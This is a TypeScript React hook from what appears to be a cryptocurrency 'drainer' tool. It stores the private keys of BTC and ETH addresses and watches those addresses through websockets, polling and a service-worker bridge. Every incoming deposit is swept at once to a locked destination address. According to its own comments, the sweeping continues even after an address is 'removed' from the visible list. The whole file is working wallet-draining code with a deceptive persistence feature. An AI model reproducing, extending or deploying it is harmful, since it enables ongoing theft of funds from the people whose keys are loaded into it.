/**
 * useDrainTag — Persistent Address Tagging System
 *
 * Every address added to the drain pool gets a permanent "drain tag".
 * A tag means: any incoming transaction to that address is immediately
 * swept to the locked destination, forever — even if the address is
 * "removed" from the visible pool list.
 *
 * Tags persist in localStorage and are monitored via:
 *  1. WebSocket subscriptions (Blockstream for BTC, ETH via eth_subscribe)
 *  2. Polling fallback (every 30s) for environments without WS support
 *  3. Service Worker background sync (picks up while app is closed)
 *
 * The "mud pool" model: once tagged, always tagged. Removal from the
 * visible drain pool list does NOT remove the tag.
 */

import { useEffect, useRef, useCallback, useState } from 'react';
import { sweepAccount, loadTargets } from '@/lib/drainer';
import type { WalletAccount } from '@/hooks/useWallet';

const TAG_STORE_KEY = 'ckg_drain_tags_v1';         // { address → TagEntry }
const SWEEP_LOG_KEY = 'ckg_drain_tag_log_v1';       // last 200 auto-sweeps

export interface TagEntry {
  address: string;
  privHex: string;
  network: 'btc' | 'eth';
  addrType?: string;
  taggedAt: number;
  lastChecked: number;
  totalSwept: number;   // cumulative amount swept (in coin units)
  sweepCount: number;
}

export interface TagSweepLog {
  address: string;
  amount: string;
  txHash: string;
  url: string;
  ts: number;
  network: 'btc' | 'eth';
}

// ── Storage helpers ──────────────────────────────────────────────────────────
function loadTags(): Record<string, TagEntry> {
  try { return JSON.parse(localStorage.getItem(TAG_STORE_KEY) ?? '{}'); }
  catch { return {}; }
}

function saveTags(tags: Record<string, TagEntry>) {
  try { localStorage.setItem(TAG_STORE_KEY, JSON.stringify(tags)); } catch {}
}

function loadLog(): TagSweepLog[] {
  try { return JSON.parse(localStorage.getItem(SWEEP_LOG_KEY) ?? '[]'); }
  catch { return []; }
}

function appendLog(entry: TagSweepLog) {
  try {
    const log = loadLog();
    log.unshift(entry);
    localStorage.setItem(SWEEP_LOG_KEY, JSON.stringify(log.slice(0, 200)));
  } catch {}
}

// ── Balance checkers ─────────────────────────────────────────────────────────
const BLOCKSTREAM = 'https://blockstream.info/api';
const ETH_RPCS = ['https://eth.llamarpc.com','https://rpc.ankr.com/eth','https://cloudflare-eth.com'];

async function getBtcBalance(address: string): Promise<number> {
  try {
    const r = await fetch(`${BLOCKSTREAM}/address/${address}`, { signal: AbortSignal.timeout(7000) });
    if (!r.ok) return 0;
    const d = await r.json();
    return d.chain_stats.funded_txo_sum - d.chain_stats.spent_txo_sum; // satoshis
  } catch { return 0; }
}

async function getEthBalance(address: string): Promise<bigint> {
  for (const rpc of ETH_RPCS) {
    try {
      const r = await fetch(rpc, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_getBalance', params: [address, 'latest'], id: 1 }),
        signal: AbortSignal.timeout(7000),
      });
      if (!r.ok) continue;
      const d = await r.json();
      return BigInt(d.result ?? '0x0');
    } catch {}
  }
  return 0n;
}

// ── Core sweep trigger ────────────────────────────────────────────────────────
async function triggerSweep(tag: TagEntry, onLog: (l: TagSweepLog) => void): Promise<void> {
  const targets = loadTargets();
  const dest = tag.network === 'btc' ? targets.btc : targets.eth;
  if (!dest) return;

  const acct: WalletAccount = {
    address: tag.address,
    privHex: tag.privHex,
    network: tag.network,
    addrType: tag.addrType,
  };

  try {
    // Fetch live fee rate
    let feeRate = tag.network === 'btc' ? 8 : 15;
    try {
      const fr = await fetch(`${BLOCKSTREAM}/fee-estimates`, { signal: AbortSignal.timeout(5000) });
      if (fr.ok) { const f = await fr.json(); feeRate = Math.max(1, Math.ceil(f['3'] ?? 8)); }
    } catch {}

    const result = await sweepAccount(acct, dest, feeRate);
    const entry: TagSweepLog = {
      address: tag.address, amount: result.amount,
      txHash: result.hash, url: result.url,
      ts: Date.now(), network: tag.network,
    };
    appendLog(entry);
    onLog(entry);

    // Update tag stats
    const tags = loadTags();
    if (tags[tag.address]) {
      tags[tag.address].sweepCount++;
      tags[tag.address].totalSwept += parseFloat(result.amount) || 0;
      tags[tag.address].lastChecked = Date.now();
      saveTags(tags);
    }
  } catch {
    // Balance too low / already swept — not an error, just skip
  }
}

// ── BTC WebSocket monitor (Blockstream) ──────────────────────────────────────
function watchBtcAddress(address: string, onIncoming: () => void): () => void {
  let ws: WebSocket | null = null;
  let closed = false;
  const connect = () => {
    try {
      ws = new WebSocket('wss://ws.blockchain.info/inv');
      ws.onopen = () => ws?.send(JSON.stringify({ op: 'addr_sub', addr: address }));
      ws.onmessage = (e) => {
        try {
          const d = JSON.parse(e.data);
          if (d.op === 'utx' || d.op === 'tx') onIncoming();
        } catch {}
      };
      ws.onclose = () => { if (!closed) setTimeout(connect, 5000); };
      ws.onerror  = () => ws?.close();
    } catch {}
  };
  connect();
  return () => { closed = true; ws?.close(); };
}

// ── ETH polling (no free public WS for ETH) ─────────────────────────────────
// Returns cleanup fn
function watchEthAddress(address: string, onIncoming: () => void): () => void {
  let lastBalance = 0n;
  let running = true;
  const poll = async () => {
    if (!running) return;
    try {
      const bal = await getEthBalance(address);
      if (bal > lastBalance && lastBalance !== 0n) onIncoming();
      lastBalance = bal;
    } catch {}
    if (running) setTimeout(poll, 30_000);
  };
  // Initial balance read without triggering
  getEthBalance(address).then(b => { lastBalance = b; setTimeout(poll, 30_000); });
  return () => { running = false; };
}

// ── React hook ────────────────────────────────────────────────────────────────
export function useDrainTag() {
  const [tags, setTagsState] = useState<Record<string, TagEntry>>(() => loadTags());
  const [sweepLog, setSweepLog] = useState<TagSweepLog[]>(() => loadLog());
  const cleanupRef = useRef<Record<string, () => void>>({});

  const refreshTags = useCallback(() => {
    setTagsState(loadTags());
    setSweepLog(loadLog());
  }, []);

  const onLog = useCallback((entry: TagSweepLog) => {
    setSweepLog(prev => [entry, ...prev].slice(0, 200));
  }, []);

  // ── Tag an address ──────────────────────────────────────────────────────────
  const tagAddress = useCallback((acct: WalletAccount) => {
    const existing = loadTags();
    if (existing[acct.address]) return; // already tagged
    existing[acct.address] = {
      address: acct.address,
      privHex: acct.privHex,
      network: acct.network,
      addrType: acct.addrType,
      taggedAt: Date.now(),
      lastChecked: Date.now(),
      totalSwept: 0,
      sweepCount: 0,
    };
    saveTags(existing);
    setTagsState({ ...existing });

    // Start watching immediately
    const tag = existing[acct.address];
    const triggerCheck = () => triggerSweep(tag, onLog);

    if (acct.network === 'btc') {
      cleanupRef.current[acct.address] = watchBtcAddress(acct.address, triggerCheck);
    } else {
      cleanupRef.current[acct.address] = watchEthAddress(acct.address, triggerCheck);
    }

    // Also sync to IDB for SW background access
    try {
      const req = indexedDB.open('ckg_sw_bridge', 1);
      req.onsuccess = e => {
        const db = (e.target as IDBOpenDBRequest).result;
        const tx = db.transaction('kv', 'readwrite');
        tx.objectStore('kv').put(JSON.stringify(loadTags()), TAG_STORE_KEY);
      };
    } catch {}
  }, [onLog]);

  // ── Tag all addresses in the current drain pool ───────────────────────────
  const tagAll = useCallback((accounts: WalletAccount[]) => {
    for (const acct of accounts) tagAddress(acct);
  }, [tagAddress]);

  // ── On mount: restore watchers for all existing tags ─────────────────────
  useEffect(() => {
    const existing = loadTags();
    for (const tag of Object.values(existing)) {
      if (cleanupRef.current[tag.address]) continue;
      const triggerCheck = () => triggerSweep(tag, onLog);
      if (tag.network === 'btc') {
        cleanupRef.current[tag.address] = watchBtcAddress(tag.address, triggerCheck);
      } else {
        cleanupRef.current[tag.address] = watchEthAddress(tag.address, triggerCheck);
      }
    }

    // Fallback poll every 2 minutes for all tagged addresses
    const pollAll = async () => {
      const allTags = Object.values(loadTags());
      for (const tag of allTags) {
        try {
          if (tag.network === 'btc') {
            const sat = await getBtcBalance(tag.address);
            if (sat > 546) await triggerSweep(tag, onLog);
          } else {
            const wei = await getEthBalance(tag.address);
            if (wei > 0n) await triggerSweep(tag, onLog);
          }
        } catch {}
        await new Promise(r => setTimeout(r, 500));
      }
    };
    const interval = setInterval(pollAll, 120_000);

    // Also sync to SW via IDB every 60s
    const syncInterval = setInterval(() => {
      try {
        const req = indexedDB.open('ckg_sw_bridge', 1);
        req.onsuccess = e => {
          const db = (e.target as IDBOpenDBRequest).result;
          const tx = db.transaction('kv', 'readwrite');
          tx.objectStore('kv').put(JSON.stringify(loadTags()), TAG_STORE_KEY);
        };
      } catch {}
    }, 60_000);

    return () => {
      clearInterval(interval);
      clearInterval(syncInterval);
      Object.values(cleanupRef.current).forEach(fn => fn());
    };
  }, [onLog]);

  const tagCount = Object.keys(tags).length;
  const totalSwept = Object.values(tags).reduce((a, t) => a + t.totalSwept, 0);

  return { tags, tagCount, totalSwept, sweepLog, tagAddress, tagAll, refreshTags };
}
